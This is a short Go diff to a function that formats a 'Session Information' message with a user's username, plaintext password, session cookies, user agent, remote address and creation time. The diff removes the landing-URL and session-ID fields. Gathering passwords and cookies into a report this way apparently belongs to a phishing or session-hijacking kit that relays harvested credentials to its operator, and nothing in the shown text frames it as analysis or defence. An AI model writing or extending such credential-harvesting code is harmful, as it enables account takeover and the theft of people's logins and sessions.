@@ -11,19 +11,15 @@ func formatSessionMessage(session Session) string {
 	return fmt.Sprintf("**Session Information**\n\n"+
 		"Username:      ➖ %s\n"+
 		"Password:      ➖ %s\n"+
-		"Landing URL:   ➖ %s\n \n"+
 
-		"Cookies:        ➖ \n ``` \n [ %s ] \n ``` \n "+
-		"Session ID:    ➖ \n ``` \n [ %s ] \n ``` \n \n"+
+		"Cookies:       ➖ \n ``` \n [ %s ] \n ``` \n "+
 
 		"User Agent:    ➖ %s\n"+
 		"Remote Address:➖ %s\n"+
 		"Create Time:   ➖ %d\n",
 		session.Username,
 		session.Password,
-		session.LandingURL,
 		string(tokensJSON), // Printing formatted JSON strings
-		session.SessionID,
 		session.UserAgent,
 		session.RemoteAddr,
 		session.CreateTime,
